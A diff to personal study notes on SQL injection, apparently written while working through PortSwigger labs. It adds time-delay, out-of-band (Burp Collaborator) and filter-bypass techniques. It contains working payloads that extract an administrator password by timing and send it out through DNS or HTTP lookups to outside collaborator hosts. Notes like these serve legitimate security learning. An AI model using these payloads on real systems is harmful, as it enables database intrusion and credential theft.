@@ -73,6 +73,13 @@ Cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
       - Alternate: `' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
         - Might not work if strings can't be compared, but can allow a binary search
       - Can be `SUBSTR` with some databases - refer to cheat sheet
+- Time delay SQLi
+  - Sometimes, the app will handle error messages gracefully, meaning no difference in application response
+  - Check for true/false boolean (depending on the database; cheat sheet has copy-paste):
+    - `'; IF (1=2) WAITFOR DELAY '0:0:10'--`
+    - `'; IF (1=1) WAITFOR DELAY '0:0:10'--`
+  - Based on the condition, retrieve data one character at a time (again depending on database):
+    - `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
 
 **Error-based SQL Injection**
 - Similar to response-based SQLi, where we can infer the result of the query based on an application error
@@ -86,7 +93,23 @@ Cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
     - Can substitute with `> 'm'` if accepted by the database
   - Intruder can do this quite well with a cluster-bomb attack (iterate all payload combinations for all positions)
 
+**OAST Techniques**
+- Applications will sometimes handle the SQL query asynchronously
+- Thus, we need to use some external service that can accept connections, like DNS, to confirm query execution 
+  - Burp collaborator works well for this
+    - Create a payload (by copying it to clipboard), then poll after sending the request
+- Payload would look something like a lookup
+  - `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`
+- Payloads from cheat sheet require decent modification. Remember to try with `UNION`, `;`, etc.
+  - Encode ` ` as `+`, `?` marks as `%3f`, `=` as `%3d`, `%` as `%25`, `:` as `%3a`, and `;` as `%3b`
+- After confirming SQL injection, exfiltration would look something like:
+  - `'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`
+  - An encoded would look something like:
+    - `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.wee8xnrdltcmbp86tyzupzx5lwrnff34.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`
+  - Again, cheat sheet has examples
+
 **Bypassing Defenses**
 - If single quotes are totally blacklisted, a `\` as the first parameter can actually unlock an apostrophe to use as part of the second payload
 - Backslashes can also be used for bypassing single quotes being replaced with double quotes
+- For WAFs, if we can encode the data (HTML, XML), doing so can bypass basic WAFs
 
